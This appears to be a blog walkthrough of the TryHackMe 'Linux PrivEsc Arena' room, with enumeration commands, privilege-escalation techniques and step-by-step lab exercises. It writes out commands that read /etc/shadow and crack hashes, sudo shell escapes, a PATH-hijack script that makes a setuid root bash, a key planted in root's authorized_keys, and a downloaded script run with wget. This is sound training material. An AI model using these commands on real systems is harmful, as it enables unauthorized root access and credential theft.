---
layout: post
title: "TryHackMe: Linux PrivEsc Arena Walkthrough"
date: 2025-11-06 23:00:00 +0530
categories: [TryHackMe]
tags: [tryhackme, walkthrough, sql-injection, privilege-escalation, suid, hash-cracking, lfc,pentesting]
render_with_liquid: false
media_subpath: /images/LinuxPrivEscArena/
description: "A concise, point-wise walkthrough focused on tools and actions used for reconnaissance, exploitation, and privilege escalation in the TryHackMe Linux PrivEsc Arena room."
---


# TryHackMe — Linux PrivEsc Arena | 06 Novermber 2025
![TryHackMe](01.jpeg)

---

## Overview
   
This document is a concise, point-wise walkthrough focused on **tools** and **actions** used for reconnaissance, exploitation, and privilege escalation in the TryHackMe **Linux PrivEsc Arena** room.


## Quick field checklist (first commands after landing on a Linux box)

1. `id` — confirm current user identity.
2. `uname -a` — check kernel and OS version.
3. `sudo -l` — list sudo privileges for current user.
4. `find / -perm -04000 -ls 2>/dev/null` — find SUID binaries.
5. `getcap -r / 2>/dev/null` — list file capabilities.
6. `cat /etc/passwd` and `cat /etc/shadow` (if readable); use `unshadow` before cracking.
7. `find / -name id_rsa -o -name authorized_keys 2>/dev/null` — search for SSH keys.
8. Run any local exploit suggestion tool present on the box (example path: `/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh`).

---

## Enumerations & general commands

1. **SSH & initial access**
   - `ssh <user>@<ip>` (use provided credentials or discovered keys).
   - Check shell history: `cat ~/.bash_history | grep -i passw`.

2. **Process & network enumeration**
   - `ps aux` — list running processes.
   - `ss -lntp` or `netstat -tulpn` — list listening services and associated PIDs.

3. **System information**
   - `uname -a`, `lsb_release -a` — kernel and distro.
   - `cat /etc/issue`, `cat /proc/version` — confirm versions for exploit matching.

4. **File & permission checks**
   - `find / -perm -04000 -ls 2>/dev/null` — SUID files.
   - `getcap -r / 2>/dev/null` — capabilities such as `cap_setuid`.
   - `find / -name '*.conf' -o -name '*.ovpn' 2>/dev/null` — search for config files with credentials.

---

## Privilege escalation vectors (tools & actions)

1. **Kernel exploits**
   - **Detection**: run a local exploit-suggester script to identify vulnerable kernel versions.
   - **Tools**: `linux-exploit-suggester`, PoC exploit code (e.g., Dirty COW), `gcc` to compile exploits.
   - **Action**: compile and run the PoC if kernel matches — e.g., compile Dirty COW and escalate to root.

2. **Stored credentials in files**
   - **Detection**: inspect common config locations: `/home/*/*.ovpn`, `/etc/openvpn/*.conf`, application config files in user directories.
   - **Tools**: standard `cat`, `grep`.
   - **Action**: extract cleartext credentials and attempt SSH/sudo logins or pivot to other accounts.

3. **Credentials in shell history**
   - **Detection**: `cat ~/.bash_history`.
   - **Action**: identify typed passwords and use them for direct access or `sudo` where applicable.

4. **Weak file permissions — passwd/shadow**
   - **Detection**: inspect `/etc/passwd` and `/etc/shadow` for readability (`ls -la /etc/shadow`).
   - **Tools**: `unshadow`, `john`, `hashcat`.
   - **Action**: copy files, create an `unshadow`ed file and crack hashes offline.

5. **SSH key abuse**
   - **Detection**: `find / -name authorized_keys -o -name id_rsa 2>/dev/null`.
   - **Action**: if a private key is found and is usable, `chmod 400 id_rsa` and `ssh -i id_rsa <user>@<ip>`.

6. **Sudo misconfigurations**
   - **Detection**: `sudo -l` to enumerate allowed commands and whether `NOPASSWD` or environment preservation is set.
   - **Common exploitation techniques & tools**:
     - Shell escapes via allowed editors or tools: `sudo vim -c '!sh'`, `sudo less /etc/shadow` then `!sh`.
     - Use `awk`, `python`, `perl` for quick shell spawn: `sudo awk 'BEGIN {system("/bin/sh")}'`.
     - LD_PRELOAD/LD_LIBRARY_PATH abuse when environment variables are preserved — requires building a shared object with `gcc`.
   - **Action**: spawn an interactive root shell using any permitted interactive binary or exploit environment preservation.

7. **SUID binary exploitation**
   - **Detection**: `find / -type f -perm -04000 -ls 2>/dev/null`.
   - **Techniques & tools**:
     - Library injection: use `strace` to see which .so files are loaded; create a malicious `.so` (C, `-fPIC -shared`) that triggers a root shell in its constructor.
     - Path/ENV manipulation: if the SUID binary invokes other programs without absolute paths, prepend `/tmp` to `PATH` and supply malicious binaries.
     - Logrotate / service helper attacks: abuse scripts and log rotation to write files as root.
   - **Action**: craft and place payloads to get a setuid root shell or spawn root command execution.

8. **Capabilities abuse**
   - **Detection**: `getcap -r / 2>/dev/null`.
   - **Action**: if a binary has `cap_setuid` or similar, use it (or call it via a language interpreter present, e.g., Python) to set UID 0 and spawn a shell.

9. **Cron-based escalation**
   - **Detection**: check system crons: `cat /etc/crontab`, `ls -la /etc/cron.*`, user crontabs.
   - **Techniques**:
     - Create or modify scripts executed by root cron to drop a setuid shell.
     - Exploit wildcard parsing or insecure `tar` usage in scheduled scripts by planting filenames that become command-line options.
   - **Action**: plant payloads and wait for cron execution; then use the resulting setuid binary or execute the payload.

10. **NFS `no_root_squash` abuse**
    - **Detection**: `cat /etc/exports` to find exported directories and flags (e.g., `no_root_squash`).
    - **Action**: mount the export from an attacker machine (or locally if possible) and create root-owned binaries on the export to escalate privileges on the server.

---

## Example commands (copy/paste friendly)

```bash
# Enumeration
id
uname -a
sudo -l
find / -perm -04000 -ls 2>/dev/null
getcap -r / 2>/dev/null

# Search for credentials & keys
find / -name '*.ovpn' -o -name '*.conf' 2>/dev/null
find / -name authorized_keys -o -name id_rsa 2>/dev/null
cat ~/.bash_history | grep -i password

# Basic SUID and capabilities checks
find / -type f -perm -04000 -ls 2>/dev/null
getcap -r / 2>/dev/null

# Example: run local exploit suggester (if present)
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```

---

## Notes & best practices

- Always validate that an exploit is safe to run in the environment. Use non-destructive enumeration first.
- Keep a copy of any modified files and record exact commands used so you can revert or explain steps.
- When cracking hashes offline, use a controlled environment (your machine) — do not attempt password cracking on machines you do not own or have authorization to test.

---

## Practical lab exercises (step-by-step)

Below are small, safe, and repeatable exercises you can perform on a local lab VM. Each exercise contains explicit commands and expected outcomes so you can practice mechanics without guessing.

### Lab 1 — Practical SUID exploitation (safe local VM)

1. **Goal:** Turn a writable `/tmp` into a directory where you can test PATH-based SUID abuses.
2. **Setup (on your lab VM as an unprivileged user):**

```bash
# create a fake binary that will be executed by the SUID target
cat <<'EOF' > /tmp/fake_bin.sh
#!/bin/sh
# this demonstrates an attacker-controlled binary
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x /tmp/fake_bin.sh

# simulate a vulnerable SUID binary that calls `helper` without absolute path
cat <<'EOF' > /tmp/vuln_call.sh
#!/bin/sh
# calls helper (no path) — attacker can control PATH
helper
EOF
chmod +x /tmp/vuln_call.sh

# Make PATH include /tmp first and run the vulnerable script to trigger fake helper
export PATH=/tmp:$PATH
/tmp/vuln_call.sh

# After the script runs, try spawning the setuid bash
/tmp/rootbash -p
```

3. **Expected outcome:** `/tmp/rootbash` exists with the setuid bit; running it spawns a privileged shell on the lab VM (only do this on systems you own).

4. **Cleanup:** `rm /tmp/fake_bin.sh /tmp/vuln_call.sh /tmp/rootbash`

### Lab 2 — Cron script injection (controlled environment)

1. **Goal:** Practice creating a script that a root cron job executes and use it to create a controlled, reversible effect.
2. **Setup:** Create a cron entry that runs a script you own (do this only on a lab VM):

```bash
# As root on your lab VM (use sudo on your own machine)
mkdir -p /opt/labcron
cat <<'EOF' > /opt/labcron/cleanup.sh
#!/bin/sh
# benign action for testing: touch a file with root ownership
touch /opt/labcron/ran_by_cron
chmod 644 /opt/labcron/ran_by_cron
EOF
chmod +x /opt/labcron/cleanup.sh

# add cron (runs every minute for testing)
echo "* * * * * root /opt/labcron/cleanup.sh" > /etc/cron.d/labcron

# Wait a minute then check
sleep 65
ls -l /opt/labcron/ran_by_cron

# Cleanup when done
rm /etc/cron.d/labcron
rm -rf /opt/labcron
```

3. **Expected outcome:** `/opt/labcron/ran_by_cron` is created by root; you practiced the timing and confirmation steps.

### Lab 3 — SSH key misuse and rotation (safe practice)

1. **Goal:** Learn how an exposed private key can be used and how to rotate keys.
2. **Setup & test:**

```bash
# create a test user and SSH key pair (on lab VM)
useradd -m labuser
su - labuser -c 'ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N ""'
# copy public key into authorized_keys for another account that accepts it
cat /home/labuser/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# From a separate session, attempt to ssh with the private key (locally)
ssh -i /home/labuser/.ssh/id_rsa root@localhost

# Cleanup: remove test user and keys
userdel -r labuser
rm -f /root/.ssh/authorized_keys
```

3. **Expected outcome:** You can authenticate as root using the private key — demonstrates why key protection matters.

### Lab 4 — Using linux-exploit-suggester and safe PoC validation

1. **Goal:** Run the exploit-suggester to locate candidate kernel exploits and validate safely.
2. **Commands:**

```bash
# on the lab VM as non-root
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O /tmp/les.sh
chmod +x /tmp/les.sh
/tmp/les.sh

# If a known exploit (e.g., Dirty COW) is suggested, do NOT run PoC on machines you don't own.
# Instead, reproduce the kernel version in a disposable VM and test the PoC there.
```

3. **Expected outcome:** The suggester lists candidate PoCs; you validate only in disposable labs.

### Lab 5 — Password hash cracking pipeline (offline)

1. **Goal:** Practice creating an unshadowed file and cracking a password hash offline in your own machine.
2. **Commands (perform on your workstation, not the target):**

```bash
# copy passwd and shadow files from lab VM (only from machines you own) to your workstation
unshadow passwd shadow > unshadowed.txt
# try John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
# or use hashcat (example for SHA-512 /etc/shadow: -m 1800)
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt
```

3. **Expected outcome:** You recover weak passwords and learn how to tune wordlists and rules for better results.

---

## Practical workflow & rules of engagement (short)

1. **Always work on systems you own or are authorized to test.** The practical exercises above assume a lab environment under your control.
2. **Non-destructive first:** enumerate and collect evidence before attempting any exploit that changes state.
3. **Versioned notes:** keep a step-by-step log with exact commands and timestamps so you can revert changes in lab environments.
4. **Cleanup:** always include cleanup steps in your practice scripts to avoid leaving persistent risky artifacts.
5. **Reproducibility:** when testing exploits, reproduce the vulnerable environment (kernel version, packages) in an isolated VM rather than running PoCs on unknown production systems.

---

*End of walkthrough.*

